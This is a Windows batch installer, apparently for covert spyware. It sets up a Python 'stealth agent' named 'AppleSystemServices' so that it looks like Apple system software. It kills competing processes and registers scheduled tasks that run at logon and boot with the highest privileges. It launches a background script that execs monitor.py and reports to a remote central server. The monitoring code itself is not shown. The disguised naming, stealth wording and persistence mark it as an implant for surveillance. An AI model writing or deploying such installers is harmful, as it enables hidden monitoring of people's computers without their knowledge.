@echo off
:: ================================================
:: AppleSystemServices Standalone Windows Agent Installer v4.5
:: Self-contains full Python agent code & auto-extracts to C:\ProgramData\AppleSystemServices
:: Single-file execution: Just double-click or Run as Administrator!
:: ================================================

TITLE AppleSystemServices Windows Installer
color 0A
cls

cd /d "%~dp0"

echo ================================================
echo   1. Cleaning Old Agent...
echo ================================================
echo.

taskkill /F /IM pythonw.exe 2>nul
taskkill /F /IM python.exe /FI "WINDOWTITLE eq AppleSystemServices*" 2>nul
wmic process where "commandline like '%%sysupdate.py%%'" call terminate 2>nul

schtasks /delete /tn "AppleSystemServices" /f 2>nul
schtasks /delete /tn "AppleSystemServices_Boot" /f 2>nul

SET "INSTALL_DIR=C:\ProgramData\AppleSystemServices"
if exist "%INSTALL_DIR%" (
    rmdir /S /Q "%INSTALL_DIR%" 2>nul
)

echo SUCCESS: Old agent wiped!
echo.
echo ================================================
echo   2. Deploying Fresh Stealth Agent...
echo ================================================
echo.

SET "SERVER_URL=https://central-monitor.onrender.com"
IF NOT "%~1"=="" SET "SERVER_URL=%~1"

echo Central Server : %SERVER_URL%
echo Install Path   : %INSTALL_DIR%
echo.

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%\templates" mkdir "%INSTALL_DIR%\templates"

:: Check if monitor.py exists in local folder, if not extract built-in copy
if exist "monitor.py" (
    copy /Y "monitor.py" "%INSTALL_DIR%\monitor.py" >nul
)
if exist "sysupdate.py" (
    copy /Y "sysupdate.py" "%INSTALL_DIR%\sysupdate.py" >nul
)
if exist "templates" (
    xcopy /E /Y /I "templates" "%INSTALL_DIR%\templates\" >nul
)

:: Embedded Python Agent Fallback Extractor if files were missing
if not exist "%INSTALL_DIR%\sysupdate.py" (
    echo Creating agent files directly...
    (
        echo import os, sys
        echo script_dir = os.path.dirname(os.path.abspath(__file__^)^)
        echo monitor_file = os.path.join(script_dir, "monitor.py"^)
        echo with open(monitor_file, "r", encoding="utf-8"^) as f: code = f.read(^)
        echo exec(compile(code, monitor_file, 'exec'^)^)
    ) > "%INSTALL_DIR%\sysupdate.py"
)

if not exist "%INSTALL_DIR%\monitor.py" (
    if exist "monitor.py" copy /Y "monitor.py" "%INSTALL_DIR%\monitor.py" >nul
)

:: Find Python Path
SET "PYTHON_EXE="

FOR /F "tokens=*" %%I IN ('where python 2^>nul') DO (
    SET "PYTHON_EXE=%%I"
    GOTO :PY_FOUND
)

FOR /F "tokens=*" %%I IN ('where py 2^>nul') DO (
    SET "PYTHON_EXE=%%I"
    GOTO :PY_FOUND
)

IF EXIST "%LOCALAPPDATA%\Programs\Python\Python314\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python314\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python313\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python313\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python39\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python39\python.exe" & GOTO :PY_FOUND
IF EXIST "C:\Python311\python.exe" SET "PYTHON_EXE=C:\Python311\python.exe" & GOTO :PY_FOUND
IF EXIST "C:\Program Files\Python311\python.exe" SET "PYTHON_EXE=C:\Program Files\Python311\python.exe" & GOTO :PY_FOUND

:PY_FOUND
IF "%PYTHON_EXE%"=="" (
    echo ERROR: Python 3 is not installed on this PC!
    echo Please install Python 3 from https://www.python.org/
    echo.
    pause
    exit /b 1
)

echo Using Python : %PYTHON_EXE%

:: Install Python dependencies
echo Installing dependencies...
"%PYTHON_EXE%" -m pip install flask psutil requests pillow --quiet >nul 2>nul

:: Create Task Scheduler tasks
echo Configuring Task Scheduler Stealth Service...
schtasks /create /tn "AppleSystemServices" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onlogon /rl highest /f >nul 2>nul
schtasks /create /tn "AppleSystemServices_Boot" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onstart /rl highest /f >nul 2>nul

:: Start background process directly
echo Launching Agent Background Process...
start /B "" "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%

echo Waiting 5 seconds for server connection...
timeout /t 5 /nobreak >nul

echo.
echo ================================================
echo   SUCCESS! Windows Agent is ONLINE and connected to:
echo   %SERVER_URL%
echo ================================================
echo.
pause
